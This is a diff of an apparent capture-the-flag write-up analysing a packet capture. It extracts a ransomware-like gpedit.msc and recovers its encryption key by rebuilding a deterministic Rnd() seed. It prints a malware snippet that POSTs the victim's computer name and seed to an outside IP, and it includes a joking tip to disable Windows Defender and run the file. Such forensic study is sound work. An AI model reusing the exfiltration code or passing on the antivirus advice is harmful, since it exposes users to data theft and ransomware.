@@ -1,8 +1,8 @@
 We are given a fairly small .pcap file that we open with Wireshark. Upon filtering for HTTP traffic, we find the first interesting request.
 
-![Alt text](URL or path to the image)
+![Alt text](images/request.PNG)
 
-It seems that a zip file was sent to the target machine. We can extract the .zip file by "following the HTTP Stream" in Wireshark and copying the raw bytes. Now, of course, we could paste these bytes into a new file using a hex editor. However, I like to promote the use of unnecessary online tools. So, I paste them into This Website and download the file.
+It seems that a zip file was sent to the target machine. We can extract the .zip file by "following the HTTP Stream" in Wireshark and copying the raw bytes. Now, of course, we could paste these bytes into a new file using a hex editor. However, I like to promote the use of unnecessary online tools. So, I paste them into ![This Website](https://tomeko.net/online_tools/hex_to_file.php?lang=en) and download the file.
 
 If they save the files being processed, that is what we call a "no-no" in privacy terms. Let’s hope they don’t try to open the file on a Windows machine.
 
@@ -11,8 +11,8 @@ The downloaded file is a zip file containing a file called gpedit.msc.
 The first hint about what this file is comes when we copy it to a Windows machine and it gets deleted immediately. This file might be malware! Here’s a pro tip for people wanting an EPT-Token: Turn off your Windows Defender and run gpedit.msc. It will irrecoverably encrypt your entire system, BUT you will also get an EPT-Coin.
 
 Upon analyzing gpedit.msc, we stumble upon this large block of URL-encoded characters:
-
-By utilizing yet another online tool, CyberChef, we decode the characters and get another Visual Basic script!
+![Alt text](images/text_block.PNG)
+By utilizing yet another online tool, [CyberChef](https://gchq.github.io/CyberChef/), we decode the characters and get another Visual Basic script!
 
 This script is quite interesting indeed
 ```vbscript
@@ -46,6 +46,8 @@ strRandom is then built using Rnd().
 
 Since Rnd() is deterministic we could recover strRandom if we had the seed. 
 
+As we can see in this snippet the seed is actually sent to http://192.168.77.136/updatelog
+
 ```vbscript
 Set httpRequest = CreateObject("WinHttp.WinHttpRequest.5.1")
 httpRequest.Open "POST", "http://192.168.77.136/updatelog", False
@@ -60,12 +62,70 @@ postDataPlaintext = computerName & vbTab & seed
 postDataPlaintext2 = computerName & vbTab & result
 ```
 
-As we can see in this snippet the seed is actually sent to http://192.168.77.136/updatelog
 
 And lo and behold we can find that request in our .pcap file.
+
+![Alt text](images/request_seed.PNG)
 
 Decoding the base64 string we get "DESKTOP-59C1C3D	43906.83" where 43906.83 is our seed.
 
 
-By 
-   
+By writing the strRandom function ourselves and initializing the Rnd() function with the seed "43906.83" 
+
+
+```vbscript
+Dim strRandom
+Dim characters
+Dim numericSeed
+Dim i
+Dim randomNum
+Dim fso
+Dim outputFile
+
+' Set your numeric seed directly. For example:
+' numericSeed = 43906.83  ' Replace this with your actual numeric seed value
+numericSeed = "43906.83"
+' Randomize with the numeric seed
+Rnd(-1)
+Randomize numericSeed
+
+' Define characters to choose from
+characters = "THEQUICKBROWNFOXJUMPSOVERTHELAZYDOG!@#$&*-+=_;0123456789thequickbrownfoxjumpsoverthlazydog"
+strRandom = ""
+
+' Generate random characters
+For i = 1 To 64
+    randomNum = Int(Len(characters) * Rnd(2))  ' Using Rnd to generate a random number
+    strRandom = strRandom & Mid(characters, randomNum + 1, 1)  ' Build the random string
+Next
+
+' Show the result in a message box
+MsgBox "The random string is: " & strRandom
+
+' Create a FileSystemObject to write the string to a file
+Set fso = CreateObject("Scripting.FileSystemObject")
+
+' Create or overwrite the output file
+Set outputFile = fso.CreateTextFile("randomString.txt", True)
+
+' Write the random string to the file
+outputFile.WriteLine strRandom
+outputFile.WriteLine numericSeed
+
+' Close the file
+outputFile.Close
+
+' Clean up
+Set outputFile = Nothing
+Set fso = Nothing
+
+
+```
+
+
+we are able to generate the following key:
+"_tfeTIO$*Vy##f@GyRfDEJvRvNerHHDrE=GHr0CRFgSX3VYD4koa-LUU&OTDe;rb"
+
+If we decrypt the volume we can access it and get our flag: EPT{it_works_the_machine_works!}
+
+
